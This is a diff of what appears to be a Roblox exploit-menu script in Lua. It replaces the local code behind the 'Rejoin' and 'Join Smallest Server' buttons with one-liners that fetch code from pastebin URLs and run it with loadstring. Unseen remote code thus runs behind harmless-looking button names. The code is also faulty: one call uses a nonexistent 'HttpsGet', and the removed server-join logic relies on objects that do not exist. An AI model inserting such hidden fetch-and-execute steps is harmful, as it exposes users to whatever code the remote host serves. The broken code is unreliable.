@@ -88,21 +88,7 @@ Local:AddButton({
 Local:AddButton({
 	Name = "Rejoin",
 	Callback = function()
-		local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local Rejoin = coroutine.create(function()
-    local Success, ErrorMessage = pcall(function()
-        TeleportService:Teleport(game.PlaceId, LocalPlayer)
-    end)
-
-    if ErrorMessage and not Success then
-        warn(ErrorMessage)
-    end
-end)
-
-coroutine.resume(Rejoin)
+        loadstring(game:HttpGet("https://pastebin.com/raw/yVdXMaFy"))();
 	end    
 })
 
@@ -119,20 +105,7 @@ Local:AddButton({
 Local:AddButton({
 	Name = "Join Smallest Server",
 	Callback = function()
-		local smallestServer = nil
-		local smallestPlayerCount = math.huge
-		for _, server in ipairs(game.Servers:GetChildren()) do
-			if server:FindFirstChild("Players") then
-				local playerCount = server.Players.PlayerCount.Value
-				if playerCount < smallestPlayerCount then
-					smallestServer = server
-					smallestPlayerCount = playerCount
-				end
-			end
-		end
-		if smallestServer then
-			game.Players.LocalPlayer:MoveTo(smallestServer)
-		end
+        loadstring(game:HttpsGet("https://pastebin.com/raw/CsKrTbdT"))();
 	end    
 })
 
